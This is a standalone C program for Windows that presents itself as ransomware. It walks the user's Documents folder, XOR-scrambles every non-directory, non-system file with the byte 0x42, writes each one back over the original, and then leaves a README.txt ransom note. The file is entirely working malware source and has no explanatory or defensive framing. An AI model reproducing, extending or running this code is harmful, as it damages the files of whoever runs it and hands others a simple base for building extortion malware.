
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

const char USERPROFILE[] = "%USERPROFILE%";
const char DOCUMENTS[] = "\\Documents\\";
const char RANSOM_MSG[] = "You've been hit with Ransomware :)";
const char README[] = "README.txt";

int main(void) {
    HANDLE hFind;
    WIN32_FIND_DATA ffd;
    FILE *fd;
    char *dirname, *filename, *buf, *msg_file;
    size_t length;
    long int size;
    char user_profile[1024];

    if (!ExpandEnvironmentStringsA(USERPROFILE, (LPSTR)&user_profile, 1024)) {
        fprintf(stderr, "error expanding env variable [%s]\n", USERPROFILE);
        exit(EXIT_FAILURE);
    }

    length = strlen(user_profile) + strlen(DOCUMENTS);

    if ((dirname = malloc(length + 2)) == NULL) {
        fprintf(stderr, "memory allocation failed [dirname]\n");
        exit(EXIT_FAILURE);
    }

    strncpy(dirname, user_profile, strlen(user_profile));
    strncpy(dirname + strlen(user_profile), DOCUMENTS, strlen(DOCUMENTS));
    strncpy(dirname + length, "*", 1);
    dirname[length + 1] = 0;

    if ((hFind = FindFirstFile(dirname, &ffd)) == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "error finding file [%s]\n", dirname);
        exit(EXIT_FAILURE);
    }

    while (FindNextFile(hFind, &ffd)) {
        if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ||
                (ffd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)) {
            continue;
        }

        if ((filename = malloc(length + strlen(ffd.cFileName) + 1)) == NULL) {
            fprintf(stderr, "memory allocation failed [filename]\n");
            exit(EXIT_FAILURE);
        }

        strncpy(filename, dirname, length);
        strncpy(filename + length, ffd.cFileName, strlen(ffd.cFileName));
        filename[length + strlen(ffd.cFileName)] = 0;

        if ((fd = fopen(filename, "rb")) == NULL) {
            fprintf(stderr, "error opening file [%s]\n", filename);
            exit(EXIT_FAILURE);
        }

        fseek(fd, 0, SEEK_END);
        size = ftell(fd);
        fseek(fd, 0, SEEK_SET);

        if ((buf = malloc(size + 1)) == NULL) {
            fprintf(stderr, "memory allocation failed [buf]\n");
            exit(EXIT_FAILURE);
        }

        if (fread(buf, 1, size, fd) != size) {
            fprintf(stderr, "error reading file [%s]\n", filename);
            exit(EXIT_FAILURE);
        }

        if (fclose(fd) == EOF) {
            fprintf(stderr, "error closing file [%s]\n", filename);
            exit(EXIT_FAILURE);
        }

        for (size_t i = 0; i < size; ++i) {
            buf[i] ^= 0x42;
        }

        if ((fd = fopen(filename, "wb")) == NULL) {
            fprintf(stderr, "error opening file [%s]\n", filename);
            exit(EXIT_FAILURE);
        }

        if (fwrite(buf, 1, size, fd) != size) {
            fprintf(stderr, "error writing file [%s]\n", filename);
            exit(EXIT_FAILURE);
        }

        if (fclose(fd) == EOF) {
            fprintf(stderr, "error closing file [%s]\n", filename);
            exit(EXIT_FAILURE);
        }

        free(buf);
        free(filename);
    }

    FindClose(hFind);

    if ((msg_file = malloc(length + strlen(README) + 1)) == NULL) {
        fprintf(stderr, "memory allocation failed [msg_file]\n");
        exit(EXIT_FAILURE);
    }

    strncpy(msg_file, dirname, length);
    strncpy(msg_file + length, README, strlen(README));
    msg_file[length + strlen(README)] = 0;

    if ((fd = fopen(msg_file, "wb")) == NULL) {
        fprintf(stderr, "error opening file [%s]\n", msg_file);
        exit(EXIT_FAILURE);
    }

    if (fwrite(RANSOM_MSG, 1, strlen(RANSOM_MSG), fd) != strlen(RANSOM_MSG)) {
        fprintf(stderr, "error writing to file [%s]\n", msg_file);
        exit(EXIT_FAILURE);
    }

    if (fclose(fd) == EOF) {
        fprintf(stderr, "error closing file [%s]\n", msg_file);
        exit(EXIT_FAILURE);
    }

    free(msg_file);
    free(dirname);

    return EXIT_SUCCESS;
}
